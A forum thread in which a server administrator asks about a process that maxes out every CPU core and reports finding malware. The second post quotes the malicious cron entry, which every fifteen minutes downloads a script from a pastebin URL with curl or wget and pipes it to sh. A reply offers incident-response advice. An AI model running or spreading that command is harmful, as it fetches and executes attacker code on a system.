---
title: "Trouble with unknown process using up all cores and memory"
date: 2019-05-14
forum: Server Platforms
---

### Post by johan855 on 2019-05-14
There is an issue with one of our 2 year old servers running 16.04.
We noticed the server was strangely slow and found that the process /tmp/migrantionds was taking up most of the computers' CPU% (all 12 cores appear at 100%)
The process runs again automatically on reboot.
The htop output is the following:

[IMG]https://imgur.com/a/SuwUX4T[/IMG]
[https://imgur.com/a/SuwUX4T](https://imgur.com/a/SuwUX4T)


[IMG]https://imgur.com/a/SuwUX4T[/IMG]Output of the command,  > [COLOR=#242729][FONT=Consolas]ps -e -o pcpu,nice,state,cputime,args --sort -pcpu | head -10[/FONT][/COLOR] is :

> %CPU  NI S     TIME COMMAND
 878   0 S 05:30:19 /tmp/migrationds

---

### Post by johan855 on 2019-05-14
It seems our server has a virus.
We found the following cron job being rebuilt and executed every time we try and change it

> */15 * * * * (curl -fsSL [hTTps://pastebin.com/raw/XiUrwYe9||wget](hTTps://pastebin.com/raw/XiUrwYe9||wget) -q -O- [hTTps://pastebin.com/raw/XiUrwYe9)|sh](hTTps://pastebin.com/raw/XiUrwYe9)|sh)


After tryng to run:
> clamscan -r --bell -i /

The process gets killed briefly after

---

### Post by TheFu on 2019-05-18
Good on you for using system monitoring and alarming.  Imagine how many people run servers and never notice stuff like that? 

Hopefully, you can look back through the versioned backups and see when the virus gained access and have taken steps to mitigate another take-over. Obviously, killing the process and removing all related code is just the 1st step.  Next would be to notify all clients that their data potentially has been accessed and share what steps have been taken to prevent it from happening again.

Nothing teaches security better than being hacked.

If this is solved, please use the 'thread tools' button and mark it that way.

Of course, if your monitoring tool didn't let someone know after about 10 minutes of heavy CPU use, perhaps it is time to correct that?

---

